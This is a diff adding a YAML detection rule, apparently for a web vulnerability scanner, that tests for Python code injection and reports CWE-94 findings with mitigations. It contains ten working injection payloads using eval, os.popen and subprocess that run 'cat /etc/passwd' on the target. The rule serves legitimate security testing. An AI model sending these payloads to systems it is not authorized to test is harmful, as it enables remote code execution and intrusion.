@@ -1,0 +1,47 @@
+rule_name: Python Code Injection
+description: Detects Python code injection vulnerabilities by attempting to execute arbitrary Python code.
+
+transform:
+  query:
+    replace_all_values_one_by_one:
+      - "eval(compile(\"\"\"for x in range(1):\\n import os\\n os.popen(r'cat /etc/passwd').read()\"\"\",'','single'))"
+      - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/passwd').read()\"\"\",'','single'))"
+      - "eval(compile(\"\"\"__import__('subprocess').check_output(r'cat /etc/passwd',shell=True)\"\"\",'','single'))"
+      - "__import__('os').popen('cat /etc/passwd').read()"
+      - "str(\"-\"*50),__import__('os').popen('cat /etc/passwd').read()"
+      - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/passwd').read();import time;time.sleep(2)\"\"\",'','single'))"
+      - "eval(compile(\"\"\"__import__('subprocess').check_output(r'cat /etc/passwd',shell=True);import time;time.sleep(2)\"\"\",'','single'))"
+      - "eval(compile(\"\"\"for x in range(1):\\n import os\\n os.popen(r'cat /etc/passwd').read()\"\"\",'','single'))"
+      - "eval(compile(\"\"\"for x in range(1):\\n import subprocess\\n subprocess.Popen(r'cat /etc/passwd',shell=True, stdout=subprocess.PIPE).stdout.read()\"\"\",'','single'))"
+      - "eval(compile(\"\"\"for x in range(1):\\n import subprocess\\n subprocess.check_output(r'cat /etc/passwd',shell=True)\"\"\",'','single'))"
+
+match_on:
+  body:
+    regex: "root:.*:0:0:"
+
+report:
+  title: "Python Code Injection"
+  description: |
+    The application is vulnerable to Python Code Injection. 
+    It was possible to execute arbitrary system commands (reading /etc/passwd) by injecting Python code into query parameters.
+
+    Original Request:
+    {{original}}
+
+    Transformed Request:
+    {{req}}
+
+    Response:
+    {{res}}
+
+  cwe: "CWE-94"
+  cvssScore: "9.8"
+  mitigation: |
+    1. Avoid using `eval()`, `exec()`, or similar functions with user-supplied input.
+    2. Input validation and sanitization.
+    3. Use safer alternatives for parsing data.
+  stepsToReproduce: |
+    1. Send the transformed request to {{req.url}}
+    2. Observe the response containing contents of /etc/passwd (e.g., "root:x:0:0:...")
+  tags: "python,dast,injection,cmdi,vuln,critical"
+  impact: "Remote Code Execution (RCE), full system compromise."
